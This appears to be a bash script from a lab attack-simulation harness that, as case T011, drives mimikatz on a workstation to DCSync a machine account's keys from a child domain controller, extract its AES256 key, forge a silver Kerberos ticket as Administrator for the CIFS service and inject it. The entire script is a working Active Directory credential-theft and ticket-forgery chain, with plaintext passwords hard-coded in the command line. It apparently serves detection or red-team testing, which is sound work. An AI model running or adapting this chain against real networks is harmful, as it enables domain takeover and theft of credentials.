#!/usr/bin/env bash
# T011 — Silver ticket from ws01 (MBR01$ machine account via DCSync child)
set -euo pipefail
source "$(dirname "$0")/../lib/campaign-a-common.sh"

CASE_ID="CADRE-T011-SILVER-${CASE_DATE:-$(date -u +%Y%m%d)}-ws01"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)
echo "=== T011 | ${CASE_ID} | T0=${T0} ==="

ws01_ensure_mimikatz
CHILD_SID="S-1-5-21-2616196951-1941128886-767624593"

ws01_exec_as analyst_t1 'T13r_An@lyst!' \
  "C:\\Tools\\cadre-attack\\mimikatz.exe \"lsadump::dcsync /domain:child.cadre.local /user:CN=MBR01,CN=Computers,DC=child,DC=cadre,DC=local /dc:dc02.child.cadre.local /authuser:chief_command /authpassword:C0mm@nd_Ch1ef! /authdomain:cadre.local\" exit 2>&1 | Tee-Object C:\\Tools\\cadre-attack\\mbr01-dcsync.txt; \$aes=(Select-String -Path C:\\Tools\\cadre-attack\\mbr01-dcsync.txt -Pattern 'aes256_hmac\\s+\\(4096\\)\\s+:\\s+(.+)' | Select-Object -First 1).Matches.Groups[1].Value.Trim(); Write-Output \"AES256=\$aes\"; C:\\Tools\\cadre-attack\\mimikatz.exe \"kerberos::golden /user:Administrator /domain:child.cadre.local /sid:${CHILD_SID} /service:cifs/mbr01.child.cadre.local /aes256:\$aes /ptt\" \"misc::cmd cmd.exe /c whoami\" exit"

cadre_export "${CASE_ID}" T011 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
